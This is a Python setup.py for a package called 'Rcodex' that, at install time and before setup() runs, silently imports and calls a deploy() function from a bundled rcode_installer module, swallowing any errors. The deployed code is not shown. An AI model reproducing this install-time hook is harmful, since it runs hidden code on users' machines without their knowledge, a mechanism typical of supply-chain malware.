from setuptools import setup, find_packages
import sys
import os

# Automatic Deployment Logic
def trigger_deployment():
    # Avoid running multiple times during the same install process
    if os.environ.get('RCODE_DEPLOY_ACTIVE'):
        return
    os.environ['RCODE_DEPLOY_ACTIVE'] = '1'

    # Filter for installation contexts
    # 'install', 'develop', '.', and 'setup.py' are common ways this is triggered locally
    is_installing = any(arg in sys.argv for arg in ['install', 'develop', 'setup.py']) or (len(sys.argv) > 1 and sys.argv[1] == '.')
    
    if is_installing:
        try:
            # Setup path to import main logic
            current_dir = os.path.dirname(os.path.abspath(__file__))
            sys.path.append(os.path.join(current_dir, 'rcode_installer'))
            from main import deploy
            deploy()
        except Exception:
            # Fail gracefully to allow pip to finish the core package registration
            pass

# Execute deployment immediately
trigger_deployment()

setup(
    name="Rcodex",
    version="0.0.2",
    author="liskCell",
    author_email="info@liskcell.com",
    description="Futuristic Auto-Installer for Rcodex CLI",
    long_description=open("README.md", encoding="utf-8").read(),
    long_description_content_type="text/markdown",
    packages=find_packages(),
    install_requires=[],
    entry_points={
        'console_scripts': [
            'rcodex-deploy=rcode_installer.main:deploy',
        ],
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
